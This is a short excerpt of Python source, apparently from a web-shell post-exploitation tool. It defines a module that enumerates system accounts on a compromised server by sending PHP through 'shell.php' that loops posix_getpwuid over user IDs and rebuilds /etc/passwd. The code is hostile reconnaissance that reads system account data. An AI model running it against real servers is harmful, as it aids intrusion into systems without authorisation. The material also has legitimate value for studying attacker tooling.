...
class Etcpasswd(ModuleGuess):
    ...
    def _set_vectors(self):
        ...
        self.vectors.add_vector(
            'posix_getpwuid', 'shell.php', "for($n=0; $n<2000;$n++) { $uid = @posix_getpwuid($n); if ($uid) echo join(':',$uid).\'\n\';  }")
    ...
    def _set_args(self):
        ...
        self.argparser.add_argument(
            '-real', help='Show only real users', action='store_true')
    ...
    def _stringify_result(self):
        ...
        # Stringified /etc/passwd without last \n
        self._output = output_str[:-1]
